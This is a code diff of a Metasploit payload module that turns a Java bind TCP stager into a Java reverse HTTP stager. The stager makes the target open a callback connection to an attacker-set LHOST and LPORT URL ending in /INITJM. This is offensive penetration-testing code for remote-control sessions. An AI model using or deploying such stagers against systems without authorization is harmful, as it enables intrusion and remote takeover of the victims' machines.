@@ -10,9 +10,7 @@
 ##
 
 require 'msf/core'
-require 'msf/core/handler/bind_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
+require 'msf/core/handler/reverse_http'
 
 module Metasploit3
 
@@ -21,18 +19,19 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Java Bind TCP stager',
+			'Name'          => 'Java Reverse HTTP Stager',
 			'Version'       => '$Revision$',
-			'Description'   => 'Listen for a connection',
+			'Description'   => 'Tunnel communication over HTTP',
 			'Author'        => [
 					'mihi',  # all the hard work
 					'egypt', # msf integration
+					'hdm',   # windows/reverse_http
 				],
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'java',
 			'Arch'          => ARCH_JAVA,
-			'Handler'       => Msf::Handler::BindTcp,
-			'Convention'    => 'javasocket',
+			'Handler'       => Msf::Handler::ReverseHttp,
+			'Convention'    => 'javaurl',
 			'Stager'        => {'Payload' => ""}
 			))
 
@@ -49,10 +48,18 @@ module Metasploit3
 		spawn = datastore["Spawn"] || 2
 		c =  ""
 		c << "Spawn=#{spawn}\n"
-		c << "LPORT=#{datastore["LPORT"]}\n" if datastore["LPORT"]
-
+		c << "URL=http://#{datastore["LHOST"]}"
+		c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
+		c << "/INITJM\n"
+		
 		c
 	end
 
+	#
+	# Always wait at least 20 seconds for this payload (due to staging delays)
+	#
+	def wfs_delay
+		20
+	end
 end
 
